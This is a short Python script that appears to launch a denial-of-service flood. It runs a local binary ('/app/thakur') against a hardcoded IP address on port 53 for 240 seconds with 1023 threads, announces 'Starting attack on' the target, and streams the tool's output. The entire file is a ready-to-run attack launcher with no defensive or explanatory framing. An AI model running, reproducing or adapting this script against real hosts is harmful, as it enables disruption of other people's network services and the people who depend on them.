#!/usr/bin/env python3
import os
import subprocess
import sys
import threading

BINARY = "/app/thakur"
TARGET_IP = "147.75.202.61"
TARGET_PORT = "53"
DURATION = "240"
THREADS = "1023"
VECTOR = "4"

def stream_output(pipe, prefix):
    for line in pipe:
        if line:
            # Force flush to stdout
            print(f"{prefix} {line.strip()}", flush=True)
            sys.stdout.flush()
    pipe.close()

def attack():
    os.system(f'chmod 777 {BINARY}')
    
    if not os.path.exists(BINARY):
        print(f"Error: {BINARY} not found!")
        sys.exit(1)
    
    cmd = [BINARY, TARGET_IP, TARGET_PORT, DURATION, THREADS, VECTOR]
    
    print(f"🔥 Starting attack on {TARGET_IP}:{TARGET_PORT}", flush=True)
    print(f"   Command: {' '.join(cmd)}", flush=True)
    
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # Merge stderr to stdout
        text=True,
        bufsize=0  # Unbuffered
    )
    
    print(f"✅ PID: {process.pid}", flush=True)
    print("-" * 60, flush=True)
    
    # Read output line by line
    for line in iter(process.stdout.readline, ''):
        print(line.strip(), flush=True)
    
    process.wait()
    print(f"[DONE] Exit code: {process.returncode}", flush=True)

if __name__ == "__main__":
    attack()
